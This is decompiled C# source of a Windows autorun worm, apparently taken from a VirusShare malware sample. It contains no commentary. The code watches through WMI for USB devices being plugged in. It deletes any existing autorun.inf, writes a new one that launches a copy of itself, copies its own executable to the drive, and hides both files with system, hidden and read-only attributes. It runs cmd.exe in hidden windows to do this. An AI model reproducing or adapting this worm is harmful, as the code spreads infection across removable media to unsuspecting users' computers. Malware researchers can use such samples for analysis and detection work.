// Decompiled with JetBrains decompiler
// Type: _2012.x0_usb
// Assembly: 2012, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 37F50512-E693-4543-B297-1759F6992563
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00007-msil\Worm.MSIL.Autorun.hw-6b32217d998d38a37e73ac0321b4dc3ab30a5dfbb350766e9c2af205a6b38543.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Threading;

namespace _2012
{
  internal class x0_usb
  {
    private static ManagementEventWatcher w;

    public static void Listen()
    {
      ManagementScope scope = new ManagementScope("root\\cimv2");
      scope.Options.EnablePrivileges = true;
      try
      {
        x0_usb.w = new ManagementEventWatcher(scope, (EventQuery) new WqlEventQuery()
        {
          EventClassName = "__InstanceCreationEvent",
          WithinInterval = new TimeSpan(0, 0, 3),
          Condition = "TargetInstance ISA 'Win32_USBControllerdevice'"
        });
        x0_usb.w.EventArrived += new EventArrivedEventHandler(x0_usb.usb_add);
        x0_usb.w.Start();
      }
      catch
      {
        if (x0_usb.w == null)
          return;
        x0_usb.w.Stop();
      }
    }

    public static void usb_add(object sender, EventArgs e)
    {
      foreach (DriveInfo drive in DriveInfo.GetDrives())
      {
        if (drive.DriveType == DriveType.Removable)
        {
          try
          {
            if (File.Exists(drive.Name + "autorun.inf"))
            {
              try
              {
                File.SetAttributes(drive.Name + "autorun.inf", File.GetAttributes(drive.Name + "autorun.inf") | FileAttributes.Normal);
                Process.Start(new ProcessStartInfo("cmd.exe", "/c attrib -a -s -r -h " + drive.Name + "autorun.inf")
                {
                  WindowStyle = ProcessWindowStyle.Hidden
                });
                File.SetAttributes(drive.Name + "autorun.inf", FileAttributes.Normal);
                Process.Start(new ProcessStartInfo("cmd.exe", "/c del " + drive.Name + "autorun.inf")
                {
                  WindowStyle = ProcessWindowStyle.Hidden
                });
              }
              catch (Exception ex)
              {
              }
            }
            if (File.Exists(drive.Name + "x625df45h426aSS.exe"))
            {
              try
              {
                File.SetAttributes(drive.Name + "x625df45h426aSS.exe", File.GetAttributes(drive.Name + "x625df45h426aSS.exe") | FileAttributes.Normal);
                Process.Start(new ProcessStartInfo("cmd.exe", "/c attrib -a -s -r -h " + drive.Name + "x625df45h426aSS.exe")
                {
                  WindowStyle = ProcessWindowStyle.Hidden
                });
                File.SetAttributes(drive.Name + "x625df45h426aSS.exe", FileAttributes.Normal);
                Process.Start(new ProcessStartInfo("cmd.exe", "/c del " + drive.Name + "x625df45h426aSS.exe")
                {
                  WindowStyle = ProcessWindowStyle.Hidden
                });
              }
              catch (Exception ex)
              {
              }
            }
          }
          catch
          {
          }
          try
          {
            StreamWriter streamWriter = new StreamWriter(drive.Name + "autorun.inf");
            streamWriter.WriteLine("[autorun]");
            streamWriter.WriteLine("label=USB");
            streamWriter.WriteLine("icon=%SystemRoot%\\system32\\SHELL32.dll,4");
            streamWriter.WriteLine("open=x625df45h426aSS.exe");
            streamWriter.WriteLine("shellexecute=x625df45h426aSS.exe");
            streamWriter.WriteLine("action=Abrir USB");
            streamWriter.Close();
            File.SetAttributes(drive.Name + "autorun.inf", File.GetAttributes(drive.Name + "autorun.inf") | FileAttributes.System | FileAttributes.Hidden | FileAttributes.NotContentIndexed | FileAttributes.ReadOnly);
          }
          catch (Exception ex)
          {
          }
          try
          {
            File.Copy(Process.GetCurrentProcess().MainModule.FileName, drive.Name + "x625df45h426aSS.exe");
            File.SetAttributes(drive.Name + "x625df45h426aSS.exe", File.GetAttributes(drive.Name + "x625df45h426aSS.exe") | FileAttributes.System | FileAttributes.Hidden | FileAttributes.NotContentIndexed | FileAttributes.ReadOnly);
          }
          catch (Exception ex)
          {
          }
          finally
          {
            Thread.Sleep(3500);
          }
        }
      }
    }
  }
}
